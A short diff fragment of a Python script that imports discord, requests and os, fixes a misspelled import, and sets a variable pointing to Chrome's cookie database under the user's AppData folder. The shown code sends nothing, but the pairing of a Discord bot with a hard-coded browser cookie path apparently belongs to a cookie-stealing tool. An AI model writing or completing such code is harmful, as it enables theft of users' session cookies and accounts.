@@ -2,7 +2,7 @@ import discord
 import requests
 import os
 from os import path
-from discord.et import commands
+from discord.ext import commands
 
 chromecookies = os.path.expanduser('~') + "\\AppData\\Local\\Google\\User Data\\Default\\Cookies"
 
